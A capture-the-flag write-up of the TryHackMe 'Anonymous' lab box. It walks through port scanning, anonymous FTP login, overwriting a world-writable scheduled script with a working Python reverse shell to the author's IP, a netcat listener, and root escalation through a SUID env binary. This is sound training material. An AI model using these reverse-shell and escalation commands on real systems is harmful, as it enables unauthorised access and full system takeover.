---
title: 'TryHackMe - Anonymous'
description: 'FTP anonymous login, writable scripts, and env privilege escalation.'
date: 2025-10-22
lastmod: 2026-07-07T18:33:34+0800
tag: 'TryHackMe · Challenge · Medium'
---

## TryHackMe - Anonymous

Room: https://tryhackme.com/room/anonymous

This is a beginner-friendly Linux box that covers basic enumeration, anonymous FTP access, and a simple privilege escalation path.

### Enumeration

I started with a port scan to see what services were running.

```shell
rustscan -a 10.10.107.147 --ulimit 9999 -- -A
```

The scan showed four open ports.

```
Open 10.10.107.147:21
Open 10.10.107.147:22
Open 10.10.107.147:139
Open 10.10.107.147:445
```

Looking closer at the service versions:

```
PORT    STATE SERVICE     REASON  VERSION
21/tcp  open  ftp         syn-ack vsftpd 2.0.8 or later
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I also checked the available SMB shares.

```shell
❯ smbclient -L 10.10.107.147
Can't load /etc/samba/smb.conf - run testparm to debug it
Password for [WORKGROUP\leon]:

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	pics            Disk      My SMB Share Directory for Pics
	IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

### Gaining a Foothold

Since FTP was running, I tried logging in with the `anonymous` account.

```shell
❯ ftp 10.10.107.147
Connected to 10.10.107.147.
220 NamelessOne's FTP Server!
Name (10.10.107.147:leon): Anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Anonymous login worked. I listed the files and found a `scripts` directory.

```shell
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.

ftp> cd scripts
250 Directory successfully changed.

ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000          1032 Nov 05 18:00 removed_files.log
-rw-r--r--    1 1000     1000            68 May 12  2020 to_do.txt
226 Directory send OK.
```

I downloaded everything to inspect locally.

```shell
ftp> mget *
```

The `clean.sh` script looked like it ran automatically.

```shell
❯ cat clean.sh removed_files.log to_do.txt
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi

Running cleanup script:  nothing to delete
...
I really need to disable the anonymous login...it's really not safe
```

Since the script was world-writable, I replaced it with a Python reverse shell.

```shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.69.221",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

I uploaded the new `clean.sh`, started a listener, and waited for the script to execute.

```shell
ftp> put clean.sh
```

```shell
❯ nc -lvnp 1234
Connection from 10.10.107.147:48228
/bin/sh: 0: can't access tty; job control turned off
$ ls
pics
user.txt
```

### Privilege Escalation

I upgraded to a proper TTY.

```shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

Then I looked for binaries that could be abused for privilege escalation.

```shell
find /usr/bin -perm -755 -print | sort
```

The `env` binary had the SUID bit set, which made it possible to spawn a root shell.

```shell
namelessone@anonymous:~$ /usr/bin/env /bin/bash -p

bash-4.4# whoami
root

bash-4.4# cd /root
bash-4.4# ls
root.txt
```

We got root :)
